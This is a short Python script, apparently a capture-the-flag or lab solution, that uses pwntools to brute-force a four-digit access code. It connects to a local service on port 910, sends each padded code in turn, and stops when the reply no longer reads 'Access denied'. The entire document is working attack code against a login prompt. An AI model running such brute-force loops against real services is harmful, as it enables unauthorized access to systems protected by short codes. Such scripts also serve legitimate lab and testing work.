from pwn import *

for i in range(0, 9999):
	code = "0" * (4 - len(str(i))) + str(i)
	r = remote("localhost", 910, level='error') 
	r.recvuntil("[$] ")
	r.sendline(code)
	response = r.recvline()
	r.close()
	if "Access denied" not in response:
		log.success("Valid code found: {}".format(code)) 
		break
